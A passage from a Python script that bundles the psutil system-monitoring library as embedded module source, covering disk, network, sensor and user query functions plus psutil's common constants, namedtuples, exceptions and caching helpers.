time spent writing to disk (in ms)\n\n    Platform specific:\n\n     - busy_time: (Linux, FreeBSD) time spent doing actual I/Os (in ms)\n     - read_merged_count (Linux): number of merged reads\n     - write_merged_count (Linux): number of merged writes\n\n    If *perdisk* is True return the same information for every\n    physical disk installed on the system as a dictionary\n    with partition names as the keys and the namedtuple\n    described above as the values.\n\n    If *nowrap* is True it detects and adjust the numbers which overflow\n    and wrap (restart from 0) and add "old value" to "new value" so that\n    the returned numbers will always be increasing or remain the same,\n    but never decrease.\n    "disk_io_counters.cache_clear()" can be used to invalidate the\n    cache.\n\n    On recent Windows versions \'diskperf -y\' command may need to be\n    executed first otherwise this function won\'t find any disk.\n    """\n    kwargs = dict(perdisk=perdisk) if LINUX else {}\n    rawdict = _psplatform.disk_io_counters(**kwargs)\n    if not rawdict:\n        return {} if perdisk else None\n    if nowrap:\n        rawdict = _wrap_numbers(rawdict, \'psutil.disk_io_counters\')\n    nt = getattr(_psplatform, "sdiskio", _common.sdiskio)\n    if perdisk:\n        for disk, fields in rawdict.items():\n            rawdict[disk] = nt(*fields)\n        return rawdict\n    else:\n        return nt(*(sum(x) for x in zip(*rawdict.values())))\n\n\ndisk_io_counters.cache_clear = functools.partial(\n    _wrap_numbers.cache_clear, \'psutil.disk_io_counters\')\ndisk_io_counters.cache_clear.__doc__ = "Clears nowrap argument cache"\n\n\n# =====================================================================\n# --- network related functions\n# =====================================================================\n\n\ndef net_io_counters(pernic=False, nowrap=True):\n    """Return network I/O statistics as a namedtuple including\n    the following fields:\n\n     - bytes_sent:   number of bytes sent\n     - bytes_recv:   number of bytes received\n     - packets_sent: number of packets sent\n     - packets_recv: number of packets received\n     - errin:        total number of errors while receiving\n     - errout:       total number of errors while sending\n     - dropin:       total number of incoming packets which were dropped\n     - dropout:      total number of outgoing packets which were dropped\n                     (always 0 on macOS and BSD)\n\n    If *pernic* is True return the same information for every\n    network interface installed on the system as a dictionary\n    with network interface names as the keys and the namedtuple\n    described above as the values.\n\n    If *nowrap* is True it detects and adjust the numbers which overflow\n    and wrap (restart from 0) and add "old value" to "new value" so that\n    the returned numbers will always be increasing or remain the same,\n    but never decrease.\n    "disk_io_counters.cache_clear()" can be used to invalidate the\n    cache.\n    """\n    rawdict = _psplatform.net_io_counters()\n    if not rawdict:\n        return {} if pernic else None\n    if nowrap:\n        rawdict = _wrap_numbers(rawdict, \'psutil.net_io_counters\')\n    if pernic:\n        for nic, fields in rawdict.items():\n            rawdict[nic] = _common.snetio(*fields)\n        return rawdict\n    else:\n        return _common.snetio(*[sum(x) for x in zip(*rawdict.values())])\n\n\nnet_io_counters.cache_clear = functools.partial(\n    _wrap_numbers.cache_clear, \'psutil.net_io_counters\')\nnet_io_counters.cache_clear.__doc__ = "Clears nowrap argument cache"\n\n\ndef net_connections(kind=\'inet\'):\n    """Return system-wide socket connections as a list of\n    (fd, family, type, laddr, raddr, status, pid) namedtuples.\n    In case of limited privileges \'fd\' and \'pid\' may be set to -1\n    and None respectively.\n    The *kind* parameter filters for connections that fit the\n    following criteria:\n\n    +------------+----------------------------------------------------+\n    | Kind Value | Connections using                                  |\n    +------------+----------------------------------------------------+\n    | inet       | IPv4 and IPv6                                      |\n    | inet4      | IPv4                                               |\n    | inet6      | IPv6                                               |\n    | tcp        | TCP                                                |\n    | tcp4       | TCP over IPv4                                      |\n    | tcp6       | TCP over IPv6                                      |\n    | udp        | UDP                                                |\n    | udp4       | UDP over IPv4                                      |\n    | udp6       | UDP over IPv6                                      |\n    | unix       | UNIX socket (both UDP and TCP protocols)           |\n    | all        | the sum of all the possible families and protocols |\n    +------------+----------------------------------------------------+\n\n    On macOS this function requires root privileges.\n    """\n    return _psplatform.net_connections(kind)\n\n\ndef net_if_addrs():\n    """Return the addresses associated to each NIC (network interface\n    card) installed on the system as a dictionary whose keys are the\n    NIC names and value is a list of namedtuples for each address\n    assigned to the NIC. Each namedtuple includes 5 fields:\n\n     - family: can be either socket.AF_INET, socket.AF_INET6 or\n               psutil.AF_LINK, which refers to a MAC address.\n     - address: is the primary address and it is always set.\n     - netmask: and \'broadcast\' and \'ptp\' may be None.\n     - ptp: stands for "point to point" and references the\n            destination address on a point to point interface\n            (typically a VPN).\n     - broadcast: and *ptp* are mutually exclusive.\n\n    Note: you can have more than one address of the same family\n    associated with each interface.\n    """\n    has_enums = sys.version_info >= (3, 4)\n    if has_enums:\n        import socket\n    rawlist = _psplatform.net_if_addrs()\n    rawlist.sort(key=lambda x: x[1])  # sort by family\n    ret = collections.defaultdict(list)\n    for name, fam, addr, mask, broadcast, ptp in rawlist:\n        if has_enums:\n            try:\n                fam = socket.AddressFamily(fam)\n            except ValueError:\n                if WINDOWS and fam == -1:\n                    fam = _psplatform.AF_LINK\n                elif (hasattr(_psplatform, "AF_LINK") and\n                        _psplatform.AF_LINK == fam):\n                    # Linux defines AF_LINK as an alias for AF_PACKET.\n                    # We re-set the family here so that repr(family)\n                    # will show AF_LINK rather than AF_PACKET\n                    fam = _psplatform.AF_LINK\n        if fam == _psplatform.AF_LINK:\n            # The underlying C function may return an incomplete MAC\n            # address in which case we fill it with null bytes, see:\n            # https://github.com/giampaolo/psutil/issues/786\n            separator = ":" if POSIX else "-"\n            while addr.count(separator) < 5:\n                addr += "%s00" % separator\n        ret[name].append(_common.snicaddr(fam, addr, mask, broadcast, ptp))\n    return dict(ret)\n\n\ndef net_if_stats():\n    """Return information about each NIC (network interface card)\n    installed on the system as a dictionary whose keys are the\n    NIC names and value is a namedtuple with the following fields:\n\n     - isup: whether the interface is up (bool)\n     - duplex: can be either NIC_DUPLEX_FULL, NIC_DUPLEX_HALF or\n               NIC_DUPLEX_UNKNOWN\n     - speed: the NIC speed expressed in mega bits (MB); if it can\'t\n              be determined (e.g. \'localhost\') it will be set to 0.\n     - mtu: the maximum transmission unit expressed in bytes.\n    """\n    return _psplatform.net_if_stats()\n\n\n# =====================================================================\n# --- sensors\n# =====================================================================\n\n\n# Linux, macOS\nif hasattr(_psplatform, "sensors_temperatures"):\n\n    def sensors_temperatures(fahrenheit=False):\n        """Return hardware temperatures. Each entry is a namedtuple\n        representing a certain hardware sensor (it may be a CPU, an\n        hard disk or something else, depending on the OS and its\n        configuration).\n        All temperatures are expressed in celsius unless *fahrenheit*\n        is set to True.\n        """\n        def convert(n):\n            if n is not None:\n                return (float(n) * 9 / 5) + 32 if fahrenheit else n\n\n        ret = collections.defaultdict(list)\n        rawdict = _psplatform.sensors_temperatures()\n\n        for name, values in rawdict.items():\n            while values:\n                label, current, high, critical = values.pop(0)\n                current = convert(current)\n                high = convert(high)\n                critical = convert(critical)\n\n                if high and not critical:\n                    critical = high\n                elif critical and not high:\n                    high = critical\n\n                ret[name].append(\n                    _common.shwtemp(label, current, high, critical))\n\n        return dict(ret)\n\n    __all__.append("sensors_temperatures")\n\n\n# Linux\nif hasattr(_psplatform, "sensors_fans"):\n\n    def sensors_fans():\n        """Return fans speed. Each entry is a namedtuple\n        representing a certain hardware sensor.\n        All speed are expressed in RPM (rounds per minute).\n        """\n        return _psplatform.sensors_fans()\n\n    __all__.append("sensors_fans")\n\n\n# Linux, Windows, FreeBSD, macOS\nif hasattr(_psplatform, "sensors_battery"):\n\n    def sensors_battery():\n        """Return battery information. If no battery is installed\n        returns None.\n\n         - percent: battery power left as a percentage.\n         - secsleft: a rough approximation of how many seconds are left\n                     before the battery runs out of power. May be\n                     POWER_TIME_UNLIMITED or POWER_TIME_UNLIMITED.\n         - power_plugged: True if the AC power cable is connected.\n        """\n        return _psplatform.sensors_battery()\n\n    __all__.append("sensors_battery")\n\n\n# =====================================================================\n# --- other system related functions\n# =====================================================================\n\n\ndef boot_time():\n    """Return the system boot time expressed in seconds since the epoch."""\n    # Note: we are not caching this because it is subject to\n    # system clock updates.\n    return _psplatform.boot_time()\n\n\ndef users():\n    """Return users currently connected on the system as a list of\n    namedtuples including the following fields.\n\n     - user: the name of the user\n     - terminal: the tty or pseudo-tty associated with the user, if any.\n     - host: the host name associated with the entry, if any.\n     - started: the creation time as a floating point number expressed in\n       seconds since the epoch.\n    """\n    return _psplatform.users()\n\n\n# =====================================================================\n# --- Windows services\n# =====================================================================\n\n\nif WINDOWS:\n\n    def win_service_iter():\n        """Return a generator yielding a WindowsService instance for all\n        Windows services installed.\n        """\n        return _psplatform.win_service_iter()\n\n    def win_service_get(name):\n        """Get a Windows service by *name*.\n        Raise NoSuchProcess if no service with such name exists.\n        """\n        return _psplatform.win_service_get(name)\n\n\n# =====================================================================\n\n\ndef _set_debug(value):\n    """Enable or disable PSUTIL_DEBUG option, which prints debugging\n    messages to stderr.\n    """\n    import psutil._common\n    psutil._common.PSUTIL_DEBUG = bool(value)\n    _psplatform.cext.set_debug(bool(value))\n\n\ndef test():  # pragma: no cover\n    from ._common import bytes2human\n    from ._compat import get_terminal_size\n\n    today_day = datetime.date.today()\n    templ = "%-10s %5s %5s %7s %7s %5s %6s %6s %6s  %s"\n    attrs = [\'pid\', \'memory_percent\', \'name\', \'cmdline\', \'cpu_times\',\n             \'create_time\', \'memory_info\', \'status\', \'nice\', \'username\']\n    print(templ % ("USER", "PID", "%MEM", "VSZ", "RSS", "NICE",  # NOQA\n                   "STATUS", "START", "TIME", "CMDLINE"))\n    for p in process_iter(attrs, ad_value=None):\n        if p.info[\'create_time\']:\n            ctime = datetime.datetime.fromtimestamp(p.info[\'create_time\'])\n            if ctime.date() == today_day:\n                ctime = ctime.strftime("%H:%M")\n            else:\n                ctime = ctime.strftime("%b%d")\n        else:\n            ctime = \'\'\n        if p.info[\'cpu_times\']:\n            cputime = time.strftime("%M:%S",\n                                    time.localtime(sum(p.info[\'cpu_times\'])))\n        else:\n            cputime = \'\'\n\n        user = p.info[\'username\'] or \'\'\n        if not user and POSIX:\n            try:\n                user = p.uids()[0]\n            except Error:\n                pass\n        if user and WINDOWS and \'\\\\\' in user:\n            user = user.split(\'\\\\\')[1]\n        user = user[:9]\n        vms = bytes2human(p.info[\'memory_info\'].vms) if \\\n            p.info[\'memory_info\'] is not None else \'\'\n        rss = bytes2human(p.info[\'memory_info\'].rss) if \\\n            p.info[\'memory_info\'] is not None else \'\'\n        memp = round(p.info[\'memory_percent\'], 1) if \\\n            p.info[\'memory_percent\'] is not None else \'\'\n        nice = int(p.info[\'nice\']) if p.info[\'nice\'] else \'\'\n        if p.info[\'cmdline\']:\n            cmdline = \' \'.join(p.info[\'cmdline\'])\n        else:\n            cmdline = p.info[\'name\']\n        status = p.info[\'status\'][:5] if p.info[\'status\'] else \'\'\n\n        line = templ % (\n            user[:10],\n            p.info[\'pid\'],\n            memp,\n            vms,\n            rss,\n            nice,\n            status,\n            ctime,\n            cputime,\n            cmdline)\n        print(line[:get_terminal_size()[0]])  # NOQA\n\n\ndel memoize_when_activated, division\nif sys.version_info[0] < 3:\n    del num, x\n\nif __name__ == "__main__":\n    test()\n')
    __stickytape_write_module('psutil/_common.py', b'# Copyright (c) 2009, Giampaolo Rodola\'. All rights reserved.\n# Use of this source code is governed by a BSD-style license that can be\n# found in the LICENSE file.\n\n"""Common objects shared by __init__.py and _ps*.py modules."""\n\n# Note: this module is imported by setup.py so it should not import\n# psutil or third-party modules.\n\nfrom __future__ import division\nfrom __future__ import print_function\n\nimport collections\nimport contextlib\nimport errno\nimport functools\nimport os\nimport socket\nimport stat\nimport sys\nimport threading\nimport warnings\nfrom collections import namedtuple\nfrom socket import AF_INET\nfrom socket import SOCK_DGRAM\nfrom socket import SOCK_STREAM\n\n\ntry:\n    from socket import AF_INET6\nexcept ImportError:\n    AF_INET6 = None\ntry:\n    from socket import AF_UNIX\nexcept ImportError:\n    AF_UNIX = None\n\nif sys.version_info >= (3, 4):\n    import enum\nelse:\n    enum = None\n\n\n# can\'t take it from _common.py as this script is imported by setup.py\nPY3 = sys.version_info[0] == 3\nPSUTIL_DEBUG = bool(os.getenv(\'PSUTIL_DEBUG\', 0))\n_DEFAULT = object()\n\n__all__ = [\n    # OS constants\n    \'FREEBSD\', \'BSD\', \'LINUX\', \'NETBSD\', \'OPENBSD\', \'MACOS\', \'OSX\', \'POSIX\',\n    \'SUNOS\', \'WINDOWS\',\n    # connection constants\n    \'CONN_CLOSE\', \'CONN_CLOSE_WAIT\', \'CONN_CLOSING\', \'CONN_ESTABLISHED\',\n    \'CONN_FIN_WAIT1\', \'CONN_FIN_WAIT2\', \'CONN_LAST_ACK\', \'CONN_LISTEN\',\n    \'CONN_NONE\', \'CONN_SYN_RECV\', \'CONN_SYN_SENT\', \'CONN_TIME_WAIT\',\n    # net constants\n    \'NIC_DUPLEX_FULL\', \'NIC_DUPLEX_HALF\', \'NIC_DUPLEX_UNKNOWN\',\n    # process status constants\n    \'STATUS_DEAD\', \'STATUS_DISK_SLEEP\', \'STATUS_IDLE\', \'STATUS_LOCKED\',\n    \'STATUS_RUNNING\', \'STATUS_SLEEPING\', \'STATUS_STOPPED\', \'STATUS_SUSPENDED\',\n    \'STATUS_TRACING_STOP\', \'STATUS_WAITING\', \'STATUS_WAKE_KILL\',\n    \'STATUS_WAKING\', \'STATUS_ZOMBIE\', \'STATUS_PARKED\',\n    # other constants\n    \'ENCODING\', \'ENCODING_ERRS\', \'AF_INET6\',\n    # named tuples\n    \'pconn\', \'pcputimes\', \'pctxsw\', \'pgids\', \'pio\', \'pionice\', \'popenfile\',\n    \'pthread\', \'puids\', \'sconn\', \'scpustats\', \'sdiskio\', \'sdiskpart\',\n    \'sdiskusage\', \'snetio\', \'snicaddr\', \'snicstats\', \'sswap\', \'suser\',\n    # utility functions\n    \'conn_tmap\', \'deprecated_method\', \'isfile_strict\', \'memoize\',\n    \'parse_environ_block\', \'path_exists_strict\', \'usage_percent\',\n    \'supports_ipv6\', \'sockfam_to_enum\', \'socktype_to_enum\', "wrap_numbers",\n    \'open_text\', \'open_binary\', \'cat\', \'bcat\',\n    \'bytes2human\', \'conn_to_ntuple\', \'debug\',\n    # shell utils\n    \'hilite\', \'term_supports_colors\', \'print_color\',\n]\n\n\n# ===================================================================\n# --- OS constants\n# ===================================================================\n\n\nPOSIX = os.name == "posix"\nWINDOWS = os.name == "nt"\nLINUX = sys.platform.startswith("linux")\nMACOS = sys.platform.startswith("darwin")\nOSX = MACOS  # deprecated alias\nFREEBSD = sys.platform.startswith(("freebsd", "midnightbsd"))\nOPENBSD = sys.platform.startswith("openbsd")\nNETBSD = sys.platform.startswith("netbsd")\nBSD = FREEBSD or OPENBSD or NETBSD\nSUNOS = sys.platform.startswith(("sunos", "solaris"))\nAIX = sys.platform.startswith("aix")\n\n\n# ===================================================================\n# --- API constants\n# ===================================================================\n\n\n# Process.status()\nSTATUS_RUNNING = "running"\nSTATUS_SLEEPING = "sleeping"\nSTATUS_DISK_SLEEP = "disk-sleep"\nSTATUS_STOPPED = "stopped"\nSTATUS_TRACING_STOP = "tracing-stop"\nSTATUS_ZOMBIE = "zombie"\nSTATUS_DEAD = "dead"\nSTATUS_WAKE_KILL = "wake-kill"\nSTATUS_WAKING = "waking"\nSTATUS_IDLE = "idle"  # Linux, macOS, FreeBSD\nSTATUS_LOCKED = "locked"  # FreeBSD\nSTATUS_WAITING = "waiting"  # FreeBSD\nSTATUS_SUSPENDED = "suspended"  # NetBSD\nSTATUS_PARKED = "parked"  # Linux\n\n# Process.connections() and psutil.net_connections()\nCONN_ESTABLISHED = "ESTABLISHED"\nCONN_SYN_SENT = "SYN_SENT"\nCONN_SYN_RECV = "SYN_RECV"\nCONN_FIN_WAIT1 = "FIN_WAIT1"\nCONN_FIN_WAIT2 = "FIN_WAIT2"\nCONN_TIME_WAIT = "TIME_WAIT"\nCONN_CLOSE = "CLOSE"\nCONN_CLOSE_WAIT = "CLOSE_WAIT"\nCONN_LAST_ACK = "LAST_ACK"\nCONN_LISTEN = "LISTEN"\nCONN_CLOSING = "CLOSING"\nCONN_NONE = "NONE"\n\n# net_if_stats()\nif enum is None:\n    NIC_DUPLEX_FULL = 2\n    NIC_DUPLEX_HALF = 1\n    NIC_DUPLEX_UNKNOWN = 0\nelse:\n    class NicDuplex(enum.IntEnum):\n        NIC_DUPLEX_FULL = 2\n        NIC_DUPLEX_HALF = 1\n        NIC_DUPLEX_UNKNOWN = 0\n\n    globals().update(NicDuplex.__members__)\n\n# sensors_battery()\nif enum is None:\n    POWER_TIME_UNKNOWN = -1\n    POWER_TIME_UNLIMITED = -2\nelse:\n    class BatteryTime(enum.IntEnum):\n        POWER_TIME_UNKNOWN = -1\n        POWER_TIME_UNLIMITED = -2\n\n    globals().update(BatteryTime.__members__)\n\n# --- others\n\nENCODING = sys.getfilesystemencoding()\nif not PY3:\n    ENCODING_ERRS = "replace"\nelse:\n    try:\n        ENCODING_ERRS = sys.getfilesystemencodeerrors()  # py 3.6\n    except AttributeError:\n        ENCODING_ERRS = "surrogateescape" if POSIX else "replace"\n\n\n# ===================================================================\n# --- namedtuples\n# ===================================================================\n\n# --- for system functions\n\n# psutil.swap_memory()\nsswap = namedtuple(\'sswap\', [\'total\', \'used\', \'free\', \'percent\', \'sin\',\n                             \'sout\'])\n# psutil.disk_usage()\nsdiskusage = namedtuple(\'sdiskusage\', [\'total\', \'used\', \'free\', \'percent\'])\n# psutil.disk_io_counters()\nsdiskio = namedtuple(\'sdiskio\', [\'read_count\', \'write_count\',\n                                 \'read_bytes\', \'write_bytes\',\n                                 \'read_time\', \'write_time\'])\n# psutil.disk_partitions()\nsdiskpart = namedtuple(\'sdiskpart\', [\'device\', \'mountpoint\', \'fstype\', \'opts\',\n                                     \'maxfile\', \'maxpath\'])\n# psutil.net_io_counters()\nsnetio = namedtuple(\'snetio\', [\'bytes_sent\', \'bytes_recv\',\n                               \'packets_sent\', \'packets_recv\',\n                               \'errin\', \'errout\',\n                               \'dropin\', \'dropout\'])\n# psutil.users()\nsuser = namedtuple(\'suser\', [\'name\', \'terminal\', \'host\', \'started\', \'pid\'])\n# psutil.net_connections()\nsconn = namedtuple(\'sconn\', [\'fd\', \'family\', \'type\', \'laddr\', \'raddr\',\n                             \'status\', \'pid\'])\n# psutil.net_if_addrs()\nsnicaddr = namedtuple(\'snicaddr\',\n                      [\'family\', \'address\', \'netmask\', \'broadcast\', \'ptp\'])\n# psutil.net_if_stats()\nsnicstats = namedtuple(\'snicstats\', [\'isup\', \'duplex\', \'speed\', \'mtu\'])\n# psutil.cpu_stats()\nscpustats = namedtuple(\n    \'scpustats\', [\'ctx_switches\', \'interrupts\', \'soft_interrupts\', \'syscalls\'])\n# psutil.cpu_freq()\nscpufreq = namedtuple(\'scpufreq\', [\'current\', \'min\', \'max\'])\n# psutil.sensors_temperatures()\nshwtemp = namedtuple(\n    \'shwtemp\', [\'label\', \'current\', \'high\', \'critical\'])\n# psutil.sensors_battery()\nsbattery = namedtuple(\'sbattery\', [\'percent\', \'secsleft\', \'power_plugged\'])\n# psutil.sensors_fans()\nsfan = namedtuple(\'sfan\', [\'label\', \'current\'])\n\n# --- for Process methods\n\n# psutil.Process.cpu_times()\npcputimes = namedtuple(\'pcputimes\',\n                       [\'user\', \'system\', \'children_user\', \'children_system\'])\n# psutil.Process.open_files()\npopenfile = namedtuple(\'popenfile\', [\'path\', \'fd\'])\n# psutil.Process.threads()\npthread = namedtuple(\'pthread\', [\'id\', \'user_time\', \'system_time\'])\n# psutil.Process.uids()\npuids = namedtuple(\'puids\', [\'real\', \'effective\', \'saved\'])\n# psutil.Process.gids()\npgids = namedtuple(\'pgids\', [\'real\', \'effective\', \'saved\'])\n# psutil.Process.io_counters()\npio = namedtuple(\'pio\', [\'read_count\', \'write_count\',\n                         \'read_bytes\', \'write_bytes\'])\n# psutil.Process.ionice()\npionice = namedtuple(\'pionice\', [\'ioclass\', \'value\'])\n# psutil.Process.ctx_switches()\npctxsw = namedtuple(\'pctxsw\', [\'voluntary\', \'involuntary\'])\n# psutil.Process.connections()\npconn = namedtuple(\'pconn\', [\'fd\', \'family\', \'type\', \'laddr\', \'raddr\',\n                             \'status\'])\n\n# psutil.connections() and psutil.Process.connections()\naddr = namedtuple(\'addr\', [\'ip\', \'port\'])\n\n\n# ===================================================================\n# --- Process.connections() \'kind\' parameter mapping\n# ===================================================================\n\n\nconn_tmap = {\n    "all": ([AF_INET, AF_INET6, AF_UNIX], [SOCK_STREAM, SOCK_DGRAM]),\n    "tcp": ([AF_INET, AF_INET6], [SOCK_STREAM]),\n    "tcp4": ([AF_INET], [SOCK_STREAM]),\n    "udp": ([AF_INET, AF_INET6], [SOCK_DGRAM]),\n    "udp4": ([AF_INET], [SOCK_DGRAM]),\n    "inet": ([AF_INET, AF_INET6], [SOCK_STREAM, SOCK_DGRAM]),\n    "inet4": ([AF_INET], [SOCK_STREAM, SOCK_DGRAM]),\n    "inet6": ([AF_INET6], [SOCK_STREAM, SOCK_DGRAM]),\n}\n\nif AF_INET6 is not None:\n    conn_tmap.update({\n        "tcp6": ([AF_INET6], [SOCK_STREAM]),\n        "udp6": ([AF_INET6], [SOCK_DGRAM]),\n    })\n\nif AF_UNIX is not None:\n    conn_tmap.update({\n        "unix": ([AF_UNIX], [SOCK_STREAM, SOCK_DGRAM]),\n    })\n\n\n# =====================================================================\n# --- Exceptions\n# =====================================================================\n\n\nclass Error(Exception):\n    """Base exception class. All other psutil exceptions inherit\n    from this one.\n    """\n    __module__ = \'psutil\'\n\n    def _infodict(self, attrs):\n        info = collections.OrderedDict()\n        for name in attrs:\n            value = getattr(self, name, None)\n            if value:\n                info[name] = value\n            elif name == "pid" and value == 0:\n                info[name] = value\n        return info\n\n    def __str__(self):\n        # invoked on `raise Error`\n        info = self._infodict(("pid", "ppid", "name"))\n        if info:\n            details = "(%s)" % ", ".join(\n                ["%s=%r" % (k, v) for k, v in info.items()])\n        else:\n            details = None\n        return " ".join([x for x in (getattr(self, "msg", ""), details) if x])\n\n    def __repr__(self):\n        # invoked on `repr(Error)`\n        info = self._infodict(("pid", "ppid", "name", "seconds", "msg"))\n        details = ", ".join(["%s=%r" % (k, v) for k, v in info.items()])\n        return "psutil.%s(%s)" % (self.__class__.__name__, details)\n\n\nclass NoSuchProcess(Error):\n    """Exception raised when a process with a certain PID doesn\'t\n    or no longer exists.\n    """\n    __module__ = \'psutil\'\n\n    def __init__(self, pid, name=None, msg=None):\n        Error.__init__(self)\n        self.pid = pid\n        self.name = name\n        self.msg = msg or "process no longer exists"\n\n\nclass ZombieProcess(NoSuchProcess):\n    """Exception raised when querying a zombie process. This is\n    raised on macOS, BSD and Solaris only, and not always: depending\n    on the query the OS may be able to succeed anyway.\n    On Linux all zombie processes are querable (hence this is never\n    raised). Windows doesn\'t have zombie processes.\n    """\n    __module__ = \'psutil\'\n\n    def __init__(self, pid, name=None, ppid=None, msg=None):\n        NoSuchProcess.__init__(self, pid, name, msg)\n        self.ppid = ppid\n        self.msg = msg or "PID still exists but it\'s a zombie"\n\n\nclass AccessDenied(Error):\n    """Exception raised when permission to perform an action is denied."""\n    __module__ = \'psutil\'\n\n    def __init__(self, pid=None, name=None, msg=None):\n        Error.__init__(self)\n        self.pid = pid\n        self.name = name\n        self.msg = msg or ""\n\n\nclass TimeoutExpired(Error):\n    """Raised on Process.wait(timeout) if timeout expires and process\n    is still alive.\n    """\n    __module__ = \'psutil\'\n\n    def __init__(self, seconds, pid=None, name=None):\n        Error.__init__(self)\n        self.seconds = seconds\n        self.pid = pid\n        self.name = name\n        self.msg = "timeout after %s seconds" % seconds\n\n\n# ===================================================================\n# --- utils\n# ===================================================================\n\n\ndef usage_percent(used, total, round_=None):\n    """Calculate percentage usage of \'used\' against \'total\'."""\n    try:\n        ret = (float(used) / total) * 100\n    except ZeroDivisionError:\n        return 0.0\n    else:\n        if round_ is not None:\n            ret = round(ret, round_)\n        return ret\n\n\ndef memoize(fun):\n    """A simple memoize decorator for functions supporting (hashable)\n    positional arguments.\n    It also provides a cache_clear() function for clearing the cache:\n\n    >>> @memoize\n    ... def foo()\n    ...     return 1\n        ...\n    >>> foo()\n    1\n    >>> foo.cache_clear()\n    >>>\n    """\n    @functools.wraps(fun)\n    def wrapper(*args, **kwargs):\n        key = (args, frozenset(sorted(kwargs.items())))\n        try:\n            return cache[key]\n        except KeyError:\n            ret = cache[key] = fun(*args, **kwargs)\n            return ret\n\n    def cache_clear():\n        """Clear cache."""\n        cache.clear()\n\n    cache = {}\n    wrapper.cache_clear = cache_clear\n    return wrapper\n\n\ndef memoize_when_activated(fun):\n    """A memoize decorator which is disabled by default. It can be\n    activated and deactivated on request.\n    For efficiency reasons it can be used only against class methods\n    accepting no arguments.\n\n    >>> class Foo:\n    ...     @memoize\n    ...     def foo()\n    ...         print(1)\n    ...\n    >>> f = Foo()\n    >>> # deactivated (default)\n    >>> foo()\n    1\n    >>> foo()\n    1\n    >>>\n    >>> # activated\n    >>> foo.cache_activate(self)\n    >>> foo()\n    1\n    >>> foo()\n    >>> foo()\n    >>>\n    """\n    @functools.wraps(fun)\n    def wrapper(self):\n        try:\n            # case 1: we previously entered oneshot() ctx\n            ret = self._cache[fun]\n        except AttributeError:\n            # case 2: we never entered oneshot() ctx\n            return fun(self)\n        except KeyError:\n            # case 3: we entered oneshot() ctx but there\'s no cache\n            # for this entry yet\n            ret = fun(self)\n            try:\n                self._cache[fun] = ret\n            except AttributeError:\n                # multi-threading race condition, see:\n                # https://github.com/giampaolo/psutil/issues/1948\n                pass\n        return ret\n\n    def cache_activate(proc):\n        """Activate cache. Expects a Process instance. Cache will be\n        stored as a "_cache" instance attribute."""\n        proc._cache = {}\n\n    def cache_deactivate(proc):\n        """Deactivate and clear cache."""\n        try:\n            del proc._cache\n        except AttributeError:\n            pass\n\n    wrapper.cache_activate = cache_activate\n    wrapper.cache_deactivate = cache_deactivate\n    return wrapper\n\n\ndef isfile_strict(path):\n    """Same as os.path.isfile() but does not swallow EACCES / EPERM\n    exceptions, see:\n    http://mail.python.org/pipermail/python-dev/2012-June/120787.html\n    """\n    try:\n        st = os.stat(path)\n    except OSError as err:\n        if err.errno in (errno.EPERM, errno.EACCES):\n            raise\n        return False\n    else:\n        return stat.S_ISREG(st.st_mode)\n\n\ndef path_exists_strict(path):\n    """Same as os.path.exists() but does not swallow EACCES / EPERM\n    exceptions, see:\n    http://mail.python.org/pipermail/python-dev/2012-June/120787.html\n    """\n    try:\n        os.stat(path)\n    except OSError as err:\n        if err.errno in (errno.EPERM, errno.EACCES):\n            raise\n        return False\n    else:\n        return True\n\n\n@memoize\ndef supports_ipv6():\n    """Return True if IPv6 is supported on this platform."""\n    if not socket.has_ipv6 or AF_INET6 is None:\n        return False\n    try:\n        sock = socket.socket(AF_INET6, socket.SOCK_STREAM)\n        with contextlib.closing(sock):\n            sock.bind(("::1", 0))\n        return True\n    except socket.error:\n        return False\n\n\ndef parse_environ_block(data):\n    """Parse a C environ block of environment variables into a dictionary."""\n    # The block is usually raw data from the target process.  It might contain\n    # trailing garbage and lines that do not look like assignments.\n    ret = {}\n    pos = 0\n\n    # localize global variable to speed up access.\n    WINDOWS_ = WINDOWS\n    while True:\n        next_pos = data.find("\\0", pos)\n        # nul byte at the beginning or double nul byte means finish\n        if next_pos <= pos:\n            break\n        # there might not be an equals sign\n        equal_pos = data.find("=", pos, next_pos)\n        if equal_pos > pos:\n            key = data[pos:equal_pos]\n            value = data[equal_pos + 1:next_pos]\n            # Windows expects environment variables to be uppercase only\n            if WINDOWS_:\n                key = key.upper()\n            ret[key] = value\n        pos = next_pos + 1\n\n    return ret\n\n\ndef sockfam_to_enum(num):\n    """Convert a numeric socket family value to an IntEnum member.\n    If it\'s not a known member, return the numeric value itself.\n    """\n    if enum is None:\n        return num\n    else:  # pragma: no cover\n        try:\n            return socket.AddressFamily(num)\n        except ValueError:\n            return num\n\n\ndef socktype_to_enum(num):\n    """Convert a numeric socket type value to an IntEnum member.\n    If it\'s not a known member, return the numeric value itself.\n    """\n    if enum is None:\n        return num\n    else:  # pragma: no cover\n        try:\n            return socket.SocketKind(num)\n        except ValueError:\n            return num\n\n\ndef conn_to_ntuple(fd, fam, type_, laddr, raddr, status, status_map, pid=None):\n    """Convert a raw connection tuple to a proper ntuple."""\n    if fam in (socket.AF_INET, AF_INET6):\n        if laddr:\n            laddr = addr(*laddr)\n        if raddr:\n            raddr = addr(*raddr)\n    if type_ == socket.SOCK_STREAM and fam in (AF_INET, AF_INET6):\n        status = status_map.get(status, CONN_NONE)\n    else:\n        status = CONN_NONE  # ignore whatever C returned to us\n    fam = sockfam_to_enum(fam)\n    type_ = socktype_to_enum(type_)\n    if pid is None:\n        return pconn(fd, fam, type_, laddr, raddr, status)\n    else:\n        return sconn(fd, fam, type_, laddr, raddr, status, pid)\n\n\ndef deprecated_method(replacement):\n    """A decorator which can be used to mark a method as deprecated\n    \'replcement\' is the method name which will be called instead.\n    """\n    def outer(fun):\n        msg = "%s() is deprecated and will be removed; use %s() instead" % (\n            fun.__name__, replacement)\n        if fun.__doc__ is None:\n            fun.__doc__ = msg\n\n        @functools.wraps(fun)\n        def inner(self, *args, **kwargs):\n            warnings.warn(msg, category=DeprecationWarning, stacklevel=2)\n            return getattr(self, replacement)(*args, **kwargs)\n        return inner\n    return outer\n\n\nclass _WrapNumbers:\n    """Watches numbers so that they don\'t overflow and wrap\n    (reset to zero).\n    """\n\n    def __init__(self):\n        self.lock = threading.Lock()\n        self.cache = {}\n        self.reminders = {}\n        self.reminder_keys = {}\n\n    def _add_dict(self, input_dict, name):\n        assert name not in self.cache\n        assert name not in self.reminders\n        assert name not in self.reminder_keys\n        self.cache[name] = input_dict\n        self.reminders[name] = collections.defaultdict(int)\n        self.reminder_keys[name] = collections.defaultdict(set)\n\n    def _remove_dead_reminders(self, input_dict, name):\n        """In case the number of keys changed between calls (e.g. a\n        disk disappears) this removes the entry from self.reminders.\n        